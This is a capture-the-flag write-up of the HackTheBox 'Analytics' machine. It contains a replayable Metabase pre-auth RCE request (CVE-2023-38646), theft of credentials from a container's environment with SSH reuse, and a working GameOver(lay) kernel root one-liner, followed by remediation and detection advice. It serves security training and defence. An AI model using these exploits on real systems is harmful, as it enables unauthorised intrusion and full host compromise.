---
layout: default
title: "HackTheBox - Analytics"
---

# HackTheBox - Analytics

**OS:** Ubuntu 22.04.3 LTS (Linux)

Analytics is a Linux machine running a public marketing site that points visitors at a
Metabase analytics instance on a separate virtual host. That Metabase build (v0.46.6) is
vulnerable to a pre-authentication remote code execution flaw (CVE-2023-38646): an
unauthenticated endpoint leaks the one-time setup token, which can be replayed to abuse the
embedded H2 database driver and run commands as the container user. The Metabase container
exposes the host SSH credentials in its environment variables, and those credentials are
reused for the real `metalytics` system account, giving the user flag. The host kernel is an
early Ubuntu 22.04 build vulnerable to GameOver(lay) (CVE-2023-2640 / CVE-2023-32629), an
OverlayFS local privilege escalation that yields a root shell directly.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (analytical.htb / data.analytical.htb) |
| Initial Access | Metabase pre-auth RCE (CVE-2023-38646) -> container env-var credential leak -> SSH reuse |
| Privilege Escalation | GameOver(lay) OverlayFS local root (CVE-2023-2640 / CVE-2023-32629) |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP scan returned only two services: OpenSSH and an nginx reverse proxy. There is no
direct application on the IP itself; everything lives behind virtual-host routing.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.9p1 (Ubuntu) |
| 80 | TCP | HTTP | nginx 1.18.0 (Ubuntu), redirects to `analytical.htb` |

```
$ nmap -sCV -p22,80 <target-ip>
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
```

> **Why this works:** the IP-based directory and vhost brute from the recon engine returned
> nothing but `302` redirects on every path. That is the tell that the server only serves
> content when the request carries the right `Host` header; the bare IP just bounces you to
> the canonical name. The next step is always to make the name resolve.

### Virtual-Host Routing

Requesting the root of the IP confirms the redirect to the named host:

```
$ curl -s -I http://<target-ip>/
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Location: http://analytical.htb/
```

Rather than edit `/etc/hosts`, the vhost can be pinned per-request with curl's `--resolve`
(useful on an attack box where editing `/etc/hosts` may need privileges you do not have):

```
$ curl -s --resolve analytical.htb:80:<target-ip> http://analytical.htb/ | grep -i data.analytical
            <li><a href="http://data.analytical.htb">Login</a></li>
```

The landing page is a static "Analytical" marketing template whose only interesting element
is a **Login** link pointing at a second virtual host, `data.analytical.htb`. Both names map
to the same IP.

### Metabase Fingerprint

The `data.` vhost serves a Metabase instance:

```
$ curl -s -o /dev/null -w "HTTP %{http_code}\n" --resolve data.analytical.htb:80:<target-ip> http://data.analytical.htb/
HTTP 200
```

Metabase exposes an unauthenticated properties endpoint that returns its exact version and,
critically, the application's one-time setup token while initial setup is incomplete:

```
$ curl -s --resolve data.analytical.htb:80:<target-ip> http://data.analytical.htb/api/session/properties \
    | python3 -c 'import sys,json; d=json.load(sys.stdin); print("version:", d["version"]["tag"]); print("setup-token:", d["setup-token"])'
version: v0.46.6
setup-token: <setup-token>
```

> **Why this matters:** Metabase `< 0.46.6.1` (and the equivalent enterprise builds) leak the
> `setup-token` from `/api/session/properties`. That token is the single missing ingredient
> for CVE-2023-38646. Versions at or below this line that still return a non-null
> `setup-token` are exploitable pre-authentication.

---

## Initial Access

### CVE-2023-38646 — Metabase Pre-Auth RCE

Metabase ships an embedded H2 database. The setup-validation endpoint
(`/api/setup/validate`) lets an unauthenticated caller test a database connection string. By
supplying an H2 JDBC URL with a malicious `INIT` clause that defines a SQL trigger containing
inline JavaScript, the application is coerced into calling `java.lang.Runtime.exec()` while
merely "validating" the connection. With the leaked setup token as authorization, this is
unauthenticated code execution.

The command to run is base64-encoded and wrapped in a brace-expansion pipeline so it survives
`Runtime.exec()` token-splitting (which splits on spaces and performs no shell parsing):

```
inner   = bash -c {echo,<b64>}|{base64,-d}|bash      # <b64> decodes to the real payload
trigger = CREATE TRIGGER ... AS $$//javascript
          java.lang.Runtime.getRuntime().exec('<inner>')
          $$--=x
```

The exploitation request (reconstructed as a standalone HTTP POST a reader can replay; the
recon engine drove the equivalent automatically):

```
$ curl -s --resolve data.analytical.htb:80:<target-ip> \
    -X POST http://data.analytical.htb/api/setup/validate \
    -H 'Content-Type: application/json' \
    -d '{
      "token": "<setup-token>",
      "details": {
        "is_on_demand": false, "is_full_sync": false, "is_sample": false,
        "cache_ttl": null, "refingerprint": false, "auto_run_queries": true,
        "schedules": {},
        "details": {
          "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,<b64-payload>}|{base64,-d}|bash')\n$$--=x",
          "advanced-options": false, "ssl": true
        },
        "name": "x", "engine": "h2"
      }
    }'
```

The endpoint returns a `400`/`500` error on the connection "validation" itself, which is
expected, the trigger fires regardless and the payload executes inside the Metabase
container.

> **Gotcha worth recording:** `Runtime.exec()` is **not** a shell. A naive
> `exec('bash -c "id | nc ..."')` is split on whitespace into argv and the pipe/redirect is
> lost. The `bash -c {echo,BASE64}|{base64,-d}|bash` idiom contains no spaces inside the
> third argv token: brace expansion turns `{echo,BASE64}` into `echo BASE64` at shell time,
> so the decode-and-execute pipeline runs as intended. This is the reliable shape for any
> Java/H2 RCE.

### Container Environment Leaks SSH Credentials

Code execution lands as the unprivileged Metabase user **inside a Docker container**, not on
the host. The container is a dead end for the flag, but its environment variables hold the
credentials the box author injected for the analytics service, including a reusable system
credential:

```
container$ id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase)

container$ env | grep -i meta
META_USER=metalytics
META_PASS=An**********
```

> **Why this works:** secrets passed to a container via `-e` / `environment:` are visible to
> any process in that container through `/proc/self/environ` and `env`. Treating an
> environment variable as a safe secret store is a recurring real-world failure; here it
> hands over a host credential from inside a sandbox that was supposed to contain the blast
> radius.

### SSH as `metalytics` (User Flag)

The leaked credential is reused for the real `metalytics` account over SSH on the host:

```
$ ssh metalytics@<target-ip>
metalytics@<target-ip>'s password: An**********

metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$ cat user.txt
<user-flag-redacted>
```

---

## Privilege Escalation

### Kernel Triage

The host is an early 22.04 release whose kernel predates the GameOver(lay) fix:

```
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
metalytics@analytics:~$ grep PRETTY /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
```

> **Why this is the path:** Ubuntu kernels `6.2.0-25` and earlier on Jammy are vulnerable to
> **CVE-2023-2640 / CVE-2023-32629** ("GameOver(lay)"). Ubuntu added non-upstream permission
> checks to OverlayFS; a bug in that code lets an unprivileged user, inside a user namespace,
> copy a file with **file capabilities** up into the overlay's upper directory while
> **preserving those capabilities** on the resulting real file. No compiler, no kernel
> module, and no network needed, it is a few shell commands.

### GameOver(lay) — OverlayFS Local Root (CVE-2023-2640 / CVE-2023-32629)

The exploit is hand-written from the public advisory (no third-party binary is run on the
attack box) and executed on the target. It copies `python3` into an overlay lower directory,
grants it `cap_setuid`, then mounts the overlay so the copy-up lands a capability-bearing
`python3` in the upper directory, which is then used to `setuid(0)`:

```
metalytics@analytics:~$ cd /tmp && rm -rf goe && mkdir goe && cd goe && \
  unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" ; \
  u/python3 -c 'import os;os.setuid(0);os.system("id; cat /root/root.txt")'
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
<root-flag-redacted>
```

`uid=0(root)` confirms full root. The flag is read directly from `/root/root.txt`.

> **Gotcha worth recording:** the one-liner depends on `cap_setuid+eip` surviving the
> OverlayFS copy-up. The `setcap` is applied to the file in the lower dir (`l/python3`); the
> bug is that mounting the overlay and touching the merged file copies it up to `u/python3`
> **with the capability intact** as an on-disk xattr a normal user could never set there.
> Running `u/python3` (the upper-dir copy) is what gives the capability outside the
> namespace.

---

## Root Cause

Analytics chains four independent failures:

1. **An unauthenticated information leak** — Metabase exposes its `setup-token` on
   `/api/session/properties`, supplying the authorization needed for the RCE.
2. **A known-vulnerable, unpatched application** — Metabase v0.46.6 is affected by
   CVE-2023-38646 (pre-auth RCE via the H2 driver).
3. **Secrets in container environment variables** — a reusable host credential
   (`metalytics`) was injected into the Metabase container and is readable by any process in
   it, defeating the container as a security boundary.
4. **An unpatched kernel** — the 22.04 host runs `6.2.0-25-generic`, vulnerable to
   GameOver(lay), turning any local user into root.

Remove any one of links 2, 3, or 4 and the path to root breaks.

## Impact

Full compromise of the host. An unauthenticated attacker reaches code execution from the
internet (link 1+2), pivots to an interactive host account via leaked credentials (link 3),
and escalates to root with a local kernel bug (link 4). Root on the host exposes the Metabase
application database, any analytics data it holds, and the machine as a foothold for further
internal movement.

## Remediation

Ordered by priority; the first two break the demonstrated path outright.

**1. Patch Metabase (highest priority).** Upgrade to a build at or above the
CVE-2023-38646 fix (Metabase `0.46.6.1` / `1.46.6.1` or later). Until patched, the instance
is remotely exploitable by anyone who can reach `data.analytical.htb`. Also restrict the
admin/setup API surface to trusted networks.

**2. Patch the kernel.** Update to a fixed Ubuntu kernel (later `6.2.0-26`+ / current HWE)
and reboot, which removes the GameOver(lay) primitive. As defense in depth, set
`kernel.unprivileged_userns_clone=0` where unprivileged user namespaces are not required, the
exploit depends on them.

**3. Stop storing reusable secrets in container environment variables.** Do not inject a host
SSH credential into an application container. Use a secrets manager, mount secrets as files
with restrictive permissions, or use short-lived/scoped credentials. The Metabase service
account must not be a valid interactive host login.

**4. Enforce credential uniqueness.** The Metabase service credential and the `metalytics`
SSH account shared the same password. Service and interactive credentials must be distinct,
and SSH should prefer key-based authentication with passwords disabled.

**5. Reduce information disclosure.** Front the Metabase setup/admin endpoints behind
authentication or network ACLs so `setup-token` and version cannot be read by anonymous
clients.

### Validation

- Re-query `/api/session/properties` and confirm `setup-token` is `null` (setup complete) and
  the version is patched.
- Replay the `/api/setup/validate` H2 payload and confirm no command execution.
- From an unprivileged shell, run the GameOver(lay) one-liner and confirm it fails to yield
  `uid=0` on the patched kernel.
- Confirm the Metabase container environment no longer contains host credentials
  (`env | grep -i meta`).

## Detection Opportunities

- **Metabase RCE:** application logs showing `POST /api/setup/validate` after setup is
  already complete, H2 connection strings containing `CREATE TRIGGER` / `javascript` /
  `Runtime.getRuntime().exec`, and the Metabase JVM spawning child processes (`bash`, `curl`,
  `base64`), a JVM should rarely fork a shell.
- **Egress from the container:** outbound connections initiated by the Metabase container to
  a non-corporate host (the reverse shell / exfil callback).
- **GameOver(lay):** auditd on `mount` of `overlay` filesystems from unprivileged user
  namespaces, `setcap` / capability-set events on files in `/tmp`, and `unshare -rm` activity
  followed by a `setuid(0)` from a non-root process. Process-lineage analytics flagging a
  shell child of `python3` running as root are high fidelity.
- **Credential reuse:** an SSH logon for `metalytics` from an unusual source closely following
  the web exploitation, correlate web RCE and SSH auth events.

## Lessons Learned

- A wall of `302`s on every IP-based path is a vhost signal, not a dead end. Pin the `Host`
  header (`--resolve`) and the application appears.
- Pre-auth RCEs frequently hinge on a paired information leak. The Metabase `setup-token`
  endpoint is the whole exploit; the "RCE" is just replaying it.
- Container compromise is rarely the objective, it is a vantage point. Always read the
  environment (`env`, `/proc/self/environ`); injected secrets are the most common pivot out
  of a container.
- For Java/H2 command execution, base64 + brace-expansion is the reliable way around
  `Runtime.exec()` not being a shell.

---

## Cleanup

- The GameOver(lay) scratch directory `/tmp/goe` (an overlay mount plus a copied `python3`)
  was created on the target; unmount/remove it (`rm -rf /tmp/goe`) to leave no artifact.
- No files were written to the attack box from untrusted sources; the exploit was written by
  hand from the public advisory and run on the target.
- No persistent changes were made to the Metabase application or its database.
- The foothold credential recovered from the container environment was validated by the
  subsequent `metalytics` SSH login; rotate it (and the service account password) as part of
  remediation.
